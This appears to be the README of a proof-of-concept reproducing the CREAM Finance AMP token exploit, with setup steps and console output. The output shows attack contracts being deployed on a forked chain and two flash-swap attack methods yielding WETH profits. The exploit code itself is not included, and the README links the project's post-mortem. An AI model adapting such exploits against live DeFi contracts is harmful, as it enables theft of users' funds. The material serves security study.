# CREAM PoC

## How to run

Install brownie first

Set up the environment variable for $ARCHIVENODE_TOKEN

```
export $ARCHIVENODE_TOKEN = xxxxx
sh start_archive.sh

then 

sh run.sh
```

```
Running 'scripts/attack.py::main'...
------ Exploit 1: using DEX obtain ETH to repay flash swap ------------
------> Step 1: deploy attack contract and register `AmpTokensRecipient` in erc1820
Transaction sent: 0x6e1bedb73772048183ea634e527e009ccfa3e184413f7195b151149fbdc58207
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 0
  Luck.constructor confirmed - Block: 13125192   Gas used: 911645 (13.56%)
  Luck deployed at: 0x9c214F0caC1fdAb0C93EA8e6636c2499F10b6036

🧛 before:  balance is 0.0 ETH
------> Step 2: call good_luck() to launch an attack
Transaction sent: 0x627dd0058ee665d099b009561f945a178276e3a2e1261de2bc3ed380cacc54f0
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 1
  Luck.good_luck confirmed - Block: 13125193   Gas used: 988358 (14.70%)

🧛 After:  balance is 130.77899048519276 WETH
🧛 After:  profit is 130.77899048519276 WETH
------ Exploit 2: using Liquidation obtain ETH to repay flash swap ------------
------> Step 1: deploy attack contract and register `AmpTokensRecipient` in erc1820
Transaction sent: 0x72e155a0a0e20f2e5d4ea2ec01649edbdfec16221764b104a9819d09da445fd2
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 0
  Luck2.constructor confirmed - Block: 13125192   Gas used: 1216758 (18.10%)
  Luck2 deployed at: 0x532AB34D5a2Ef27FDCf485e2e6fbAa6371e48138

🧛 before:  balance is 0.0 ETH
------> Step 2: call good_luck() to launch an attack
Transaction sent: 0x3a0c24d208738c9d21bc75aaa607b10e2e02adab2cd8021ccc280e61471fbf5e
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 1
  Luck2.good_luck confirmed - Block: 13125193   Gas used: 1564748 (23.28%)

🧛 After:  balance is 75.99349268338645 WETH
🧛 After:  profit is 224.9846920640469 WETH
```

In the PoC, we demostrate two different methods to obtain the profits.

* Method 1: swapping the whole AMP tokens in DEX
* Method 2: 1/2 AMP for Liquidation and 1/2 AMP for swapping in DEX


## link 

* https://mp.weixin.qq.com/s/ht2YskJ9i3yCgY-PLC6vKw

* https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5

